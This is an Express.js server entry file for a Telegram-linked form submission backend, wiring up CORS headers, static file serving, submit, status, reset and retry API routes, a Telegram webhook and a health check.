/**
 * ============================================================
 *  Telegram Form Submission Backend (Node.js + Express)
 * ============================================================
 */

const express = require('express');
const path    = require('path');
const fs      = require('fs');

const submitRoute = require('./routes/submit');
const statusRoute = require('./routes/status');
const resetRoute  = require('./routes/reset');
const retryRoute  = require('./routes/retry');

const { startBotPolling, handleUpdate } = require('./botService');

const app  = express();
const PORT = process.env.PORT || 3000;

// ---------- Middleware ----------
// Enable CORS for cross-origin requests from the frontend (paidcreditbook.site -> api.paidcreditbook.site)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Serve static frontend files (assets, images, and root index.html)
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use('/img', express.static(path.join(__dirname, 'img')));

if (fs.existsSync(path.join(__dirname, 'public'))) {
    app.use(express.static(path.join(__dirname, 'public')));
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Ensure data directory exists
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

// ---------- Routes (support both /api/x and /api/x.php for full compatibility) ----------
app.use(['/api/submit', '/api/submit.php'], submitRoute);
app.use(['/api/status', '/api/status.php'], statusRoute);
app.use(['/api/reset',  '/api/reset.php'],  resetRoute);
app.use(['/api/retry',  '/api/retry.php'],  retryRoute);

// Telegram Webhook endpoint (useful for cPanel / production hosting)
app.post(['/api/telegram-webhook', '/api/telegram-webhook.php'], async (req, res) => {
    try {
        if (req.body) {
            await handleUpdate(req.body);
        }
    } catch (err) {
        console.error('Telegram Webhook error:', err.message);
    }
    res.sendStatus(200);
});

// ---------- Health check ----------
app.get('/health', (req, res) => res.json({ ok: true, time: Date.now() }));

// ---------- Start ----------
app.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
    startBotPolling();
});